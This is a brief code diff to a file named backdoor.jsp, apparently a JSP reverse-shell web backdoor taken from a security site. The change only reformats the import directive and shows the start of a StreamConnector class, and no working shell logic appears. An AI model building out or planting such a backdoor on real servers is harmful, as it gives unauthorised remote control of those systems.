@@ -1,9 +1,7 @@
 // backdoor.jsp
 // http://www.security.org.sg/code/jspreverse.html
 
-<%@
-page import="java.lang.*, java.util.*, java.io.*, java.net.*"
-% >
+<%@ page import="java.lang.*, java.util.*, java.io.*, java.net.*" %>
 <%!
 static class StreamConnector extends Thread
 {
